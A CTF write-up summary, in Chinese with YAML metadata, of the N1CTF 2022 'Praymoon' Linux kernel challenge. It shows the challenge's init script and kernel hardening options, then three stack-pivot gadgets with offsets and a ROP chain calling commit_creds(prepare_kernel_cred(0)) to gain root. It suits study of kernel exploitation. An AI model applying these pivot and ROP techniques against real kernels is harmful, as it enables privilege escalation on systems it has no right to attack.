---
title: N1CTF 2022 Praymoon Write Up (Linux kernel exploit)
contest: N1CTF
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [Linux kernel, praymoon.ko, /dev/seven, stack pivot, CONFIG_SLAB_FREELIST_RANDOM]
attack_chain: |
  1. 题目: N1CTF 2022 Praymoon — Linux kernel exploit
  2. 环境:
     - /init: insmod /praymoon.ko + chmod 666 /dev/seven + chmod 740 /flag
     - echo 1 > /proc/sys/kernel/kptr_restrict (KASLR 启用)
     - echo 1 > /proc/sys/kernel/dmesg_restrict
     - chmod 400 /proc/kallsyms (符号表不可读)
     - setsid /bin/cttyhack setuidgid 1000 /bin/sh (非 root)
  3. 内核 hardening:
     - CONFIG_SLAB_FREELIST_RANDOM=y (slab freelist 随机)
     - CONFIG_SLAB_FREELIST_HARDENED=y
     - CONFIG_SHUFFLE_PAGE_ALLOCATOR=y
     - CONFIG_STATIC_USERMODEHELPER=y (阻止 modprobe_path 攻击)
     - CONFIG_DEBUG_LIST=y
     - CONFIG_HARDENED_USERCOPY=y
     - CONFIG_MEMCG=y
  4. 攻击: stack pivot
     - stack_pivot_gadget_0: push rsi; jge 0x3247e8; jmp qword ptr [rsi + 0x41]
     - stack_pivot_gadget_1: pop rsp; add rsp, 0x68; pop rbx; ret
     - stack_pivot_gadget_2: add rsp, 0x78; ret
     - 完整 chain: gadget_0 → gadget_1 (改 RSP) → gadget_2 (跳到 ROP)
key_payload: |
  // Praymoon 攻击 stack pivot gadgets:
  uint64_t stack_pivot_gadget_0 = kernel_base - 0xffffffff81000000 + 0xffffffff811247e6;
  // push rsi; jge 0x3247e8; jmp qword ptr [rsi + 0x41];
  
  uint64_t stack_pivot_gadget_1 = kernel_base - 0xffffffff81000000 + 0xffffffff8134862c;
  // pop rsp; add rsp, 0x68; pop rbx; ret;
  
  uint64_t stack_pivot_gadget_2 = kernel_base - 0xffffffff81000000 + 0xffffffff813f643e;
  // add rsp, 0x78; ret;
  
  // 攻击链: pivot_0 → pivot_1 (改 RSP) → pivot_2 (跳到 ROP)
  // ROP: commit_creds(prepare_kernel_cred(0)) + 跳用户态
one_liner: N1CTF 2022 Praymoon: Linux kernel exploit (praymoon.ko + /dev/seven), 利用 stack_pivot_gadget 0/1/2 三段链式 pivot 提权。
lesson: |
  - N1CTF 2022 kernel 题目全面硬化 (SLAB freelist random + HARDENED_USERCOPY + modprobe_path 不可用)
  - 攻击面局限: 只能 stack pivot + ROP
  - stack_pivot_gadget_0: push rsi; jge ...; jmp [rsi+0x41] — 改 RIP 通过 RSI
  - stack_pivot_gadget_1: pop rsp; add rsp, 0x68; pop rbx; ret — 改 RSP
  - stack_pivot_gadget_2: add rsp, 0x78; ret — 调 RSP 偏移
  - CONFIG_STATIC_USERMODEHELPER 阻止 modprobe_path 攻击
  - 提权标准流程: commit_creds(prepare_kernel_cred(0)) + 跳用户态
quality: high
---

# N1CTF 2022 Praymoon Write Up

> 来源: ctfiot.com 76392

## 题目环境

### /init 脚本

```sh
#!/bin/sh
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
mount -t tmpfs none /tmp
mdev -s
echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
echo 1 > /proc/sys/vm/unprivileged_userfaultfd

insmod /praymoon.ko
chmod 666 /dev/seven
chmod 740 /flag
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
chmod 400 /proc/kallsyms

setsid /bin/cttyhack setuidgid 1000 /bin/sh
umount /proc
umount /tmp
poweroff -d 0 -f
```

### 内核 hardening

```config
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_SHUFFLE_PAGE_ALLOCATOR=y
CONFIG_STATIC_USERMODEHELPER=y
CONFIG_STATIC_USERMODEHELPER_PATH=""
CONFIG_MEMCG=y
CONFIG_MEMCG_SWAP=y
CONFIG_MEMCG_KMEM=y
CONFIG_DEBUG_LIST=y
CONFIG_HARDENED_USERCOPY=y
```

## Stack Pivot Gadgets

```c
// push rsi; jge 0x3247e8; jmp qword ptr [rsi + 0x41];
uint64_t stack_pivot_gadget_0 = kernel_base - 0xffffffff81000000 + 0xffffffff811247e6;

// pop rsp; add rsp, 0x68; pop rbx; ret;
uint64_t stack_pivot_gadget_1 = kernel_base - 0xffffffff81000000 + 0xffffffff8134862c;

// add rsp, 0x78; ret;
uint64_t stack_pivot_gadget_2 = kernel_base - 0xffffffff81000000 + 0xffffffff813f643e;
```

## 攻击链

1. **stack_pivot_gadget_0** — 改 RIP 通过 RSI 控制流
2. **stack_pivot_gadget_1** — `pop rsp; add rsp, 0x68; pop rbx; ret` 改 RSP 到攻击者控制 buffer
3. **stack_pivot_gadget_2** — `add rsp, 0x78; ret` 跳过 padding 跳到 ROP
4. **ROP** — `commit_creds(prepare_kernel_cred(0))` + 跳回用户态

## 评价

N1CTF 2022 kernel exploit 高难度题，**全面硬化**：
- SLAB freelist random → 堆分配不可预测
- HARDENED_USERCOPY → 内核/用户态拷贝检查严格
- STATIC_USERMODEHELPER → 阻断 modprobe_path 攻击
- /proc/kallsyms 不可读 → 不能直接拿函数地址

唯一可行的攻击面是 **stack pivot + ROP**。

适用读者：Linux kernel 漏洞研究 / 高级 rootkit 分析
